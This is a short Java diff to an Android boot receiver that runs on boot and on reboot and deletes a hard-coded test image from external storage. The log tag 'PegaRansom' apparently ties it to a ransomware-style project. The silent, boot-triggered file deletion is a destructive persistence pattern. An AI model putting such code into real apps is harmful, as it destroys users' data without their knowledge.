@@ -10,25 +10,28 @@ public class BootReceiver extends BroadcastReceiver {
     
     @Override
     public void onReceive(Context context, Intent intent) {
-        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
-            // Hapus file saat boot/reboot
+        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) ||
+            Intent.ACTION_REBOOT.equals(intent.getAction())) {
+            
             deleteTargetFile();
         }
     }
     
     private void deleteTargetFile() {
         try {
-            String path = Environment.getExternalStorageDirectory().getAbsolutePath() + 
-                         "/Pictures/100PINT/Pins/tes.jpg";
-            File file = new File(path);
+            // Path yang benar untuk Android 10+
+            String basePath = Environment.getExternalStorageDirectory().getAbsolutePath();
+            String targetPath = basePath + "/Pictures/100PINT/Pins/tes.jpg";
             
-            if (file.exists()) {
-                file.delete();
-                // Log ke system
-                android.util.Log.d("PegaRansom", "File deleted on boot: " + path);
+            File targetFile = new File(targetPath);
+            
+            if (targetFile.exists()) {
+                boolean deleted = targetFile.delete();
+                android.util.Log.d("PegaRansom", 
+                    "Boot receiver: File deleted = " + deleted + ", Path: " + targetPath);
             }
         } catch (Exception e) {
-            android.util.Log.e("PegaRansom", "Boot delete error: " + e.getMessage());
+            android.util.Log.e("PegaRansom", "Error in BootReceiver: " + e.getMessage());
         }
     }
 }
